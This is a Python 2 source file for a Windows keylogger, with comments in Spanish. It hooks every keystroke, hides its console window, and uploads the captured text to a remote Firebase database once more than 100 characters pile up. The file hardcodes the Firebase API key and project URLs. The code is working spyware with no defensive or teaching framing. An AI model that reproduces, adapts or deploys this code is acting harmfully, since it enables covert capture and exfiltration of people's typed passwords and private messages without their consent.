
try:
    import pythoncom, pyHook
except:
    print "Por Favor instala pythoncom y pyHook modules"
    exit(0)
 
import datetime
import win32console, win32gui

import firebase_admin
from firebase_admin import credentials
from firebase_admin import db

import pyrebase
import urllib,urllib2
# Get a reference to the database service

config = {
    "apiKey": "AIzaSyABQ0wcIzMCxhvCYkAZgeRDS5xVsSIMHfQ",
    "authDomain": "isuscribe-9959a.firebaseapp.com",
    "databaseURL": "https://isuscribe-9959a.firebaseio.com",
    "projectId": "isuscribe-9959a",
    "storageBucket": "isuscribe-9959a.appspot.com",
    "messagingSenderId": "378149954801"
}

firebase = pyrebase.initialize_app(config)
db = firebase.database()


 

x=''
data=''
count=0
#Hide Console
def hide():
    import win32console,win32gui
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window,0)
    return True

#Local Keylogger
def local():
    global data,count 
    if len(data)>100:
        count+=1
        # log="log6.txt"
        # fp=open(str(log),"a")
        # fp.write(data)
        # fp.close()
        print count
        save = {"contenido": data }
        result = db.child("prueba").push(save)
        try:
            # print save
            data = ""
            print "Subimos al servidor"
            
            # save = ''
            
        except Exception as e:
            print e

    return True


def keypressed(event):
    global x, data
    if event.Ascii == 13:
        keys = '[ENTER]'
    elif event.Ascii == 8:
        keys = '[<]'
    elif event.Ascii == 9:
        keys = '[TAB]'
    else:
        # keys = chr(event.KeyID)
        keys = chr(event.Ascii)
        
    print keys
    data = data + keys
    # print data
    local()
    hide()
    return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = keypressed
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()